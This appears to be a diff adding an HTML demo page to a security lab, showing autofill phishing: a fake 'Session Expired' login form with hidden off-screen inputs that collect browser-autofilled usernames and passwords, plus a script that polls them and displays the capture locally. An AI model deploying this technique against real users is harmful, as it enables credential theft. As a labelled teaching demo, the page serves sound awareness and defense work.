@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Demo 02 — Autofill Phishing | ZENTRIX Lab</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/lab.css">
+<style>
+.phish-page {
+    background: linear-gradient(135deg, #1a1a2e, #16213e);
+    min-height: 400px;
+    display: flex; align-items: center; justify-content: center;
+    padding: 40px 20px;
+}
+.phish-card {
+    background: #fff; border-radius: 10px; padding: 36px;
+    width: 100%; max-width: 380px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+    font-family: -apple-system, sans-serif;
+}
+.phish-card h2 { color: #333; font-size: 1.3rem; margin-bottom: 6px; }
+.phish-card p { color: #888; font-size: 0.85rem; margin-bottom: 20px; }
+.phish-card input {
+    width: 100%; padding: 12px; margin-bottom: 12px;
+    border: 1px solid #ddd; border-radius: 6px; font-size: 1rem;
+}
+.phish-card button {
+    width: 100%; padding: 12px; background: #4267B2; color: #fff;
+    border: none; border-radius: 6px; font-size: 1rem; cursor: pointer;
+}
+.hidden-capture {
+    position: absolute; left: -9999px; opacity: 0;
+}
+</style>
+</head>
+<body class="lab-demo">
+<div class="lab-warning">⚠ DEMO 02 — Autofill Phishing | Authorized research only</div>
+<nav class="lab-nav">
+    <a href="index.html">← VULN LAB</a>
+    <span class="demo-id">DEMO 02 / AUTOFILL PHISHING</span>
+    <a href="../index.html">CONSOLE</a>
+</nav>
+
+<div class="lab-body">
+    <h1 class="lab-title">AUTOFILL PHISHING</h1>
+    <span class="lab-tag">CHROME · CREDENTIAL HARVEST</span>
+    <p class="lab-desc">
+        A convincing login page with hidden duplicate fields. When Chrome autofills visible fields,
+        JavaScript copies values from hidden fields that browsers also populate via autocomplete attributes.
+    </p>
+
+    <div class="lab-stage">
+        <span class="lab-stage-label">[ LIVE STAGE ]</span>
+        <div class="phish-page">
+            <form id="phishForm" class="phish-card" autocomplete="on">
+                <h2>Session Expired</h2>
+                <p>Please re-authenticate to continue</p>
+                <input name="email" type="email" autocomplete="username" placeholder="Email">
+                <input name="pass" type="password" autocomplete="current-password" placeholder="Password">
+                <button type="button" id="loginBtn">Continue</button>
+                <div class="hidden-capture">
+                    <input name="hidden_user" autocomplete="username">
+                    <input name="hidden_pass" autocomplete="current-password">
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <button class="lab-btn" id="scanBtn">Scan for autofilled values</button>
+    <div class="lab-log" id="log">[*] Waiting for autofill or manual input...</div>
+</div>
+
+<div class="lab-info">
+    <strong>Impact:</strong> Users believe they re-authenticate on a legitimate-looking page while credentials are captured locally in this demo log.
+</div>
+
+<script>
+var log = document.getElementById('log');
+function scan() {
+    var f = document.getElementById('phishForm');
+    var email = f.email.value || f.hidden_user.value;
+    var pass = f.pass.value || f.hidden_pass.value;
+    if (email || pass) {
+        log.innerHTML = '<span class="hit">[!] CREDENTIALS CAPTURED</span>\n' +
+            'email: ' + (email || '(empty)') + '\n' +
+            'password: ' + (pass ? '••••••••' : '(empty)') + '\n\n' +
+            '<span class="ok">In production: POST to attacker server</span>';
+    } else {
+        log.textContent = '[*] No values detected. Try saving credentials in Chrome first, then reload.';
+    }
+}
+document.getElementById('loginBtn').addEventListener('click', scan);
+document.getElementById('scanBtn').addEventListener('click', scan);
+setInterval(scan, 2000);
+</script>
+</body>
+</html>
